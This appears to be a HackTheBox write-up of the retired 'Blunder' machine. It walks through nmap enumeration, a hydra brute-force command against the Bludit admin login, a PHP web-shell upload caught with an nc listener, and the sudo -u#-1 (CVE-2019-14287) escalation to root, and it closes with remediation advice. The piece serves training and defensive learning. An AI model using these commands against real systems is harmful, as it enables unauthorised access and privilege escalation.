HTB Blunder: Bludit brute force to shell, sudo bypass to root

retired-machineeasy

Blunder is a retired HackTheBox easy Linux machine in two famous acts. Synopsis: a brute-forceable Bludit admin panel plus upload RCE, then the iconic sudo -u#-1 bypass (CVE-2019-14287) walking past the user check.

$ Enumeration — name the CMS

# bash: confirm Bludit, skip the rabbit holes
nmap -sC -sV -oN blunder.nmap 10.10.10.191
# footer + generator: Bludit (flat-file CMS, no rate-limited login)

Apache with Bludit — a flat-file CMS whose login has no meaningful rate limiting. Version noted, wordlist loaded.

$ Foothold — brute force plus upload

# bash: hydra the admin, upload the shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.191 http-post-form "/admin/login:username=^USER^&password=^PASS^:incorrect"
# logged in as admin -> Images -> upload shell (zip/image bypass per version) -> browse to it
nc -lvnp 4444   # www-data

Brute-force the admin password, log in, and abuse the image-upload path to land a PHP shell as www-data. The upload needs the session — brute force is the intended door.

$ Privilege escalation — sudo -u#-1 (CVE-2019-14287)

# bash: one flag past the user check
sudo -l   # (someuser) NOPASSWD: /bin/bash  (restricted to non-root user)
sudo -u#-1 /bin/bash
id   # uid=0(root)

Sudo mishandles user ID -1 (aliasing to 0 when no user holds UID 4294967295): one flag turns a user restriction into a root shell. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Uploading shells before admin access and kernel exploits before sudo -l (the five-second check names the exact bypass).

$ Remediation notes

Rate-limit CMS logins, validate uploads outside the web root, patch sudo past 1.8.28, and re-audit user-restricted sudoers lines. Written by Lucky Thandel.
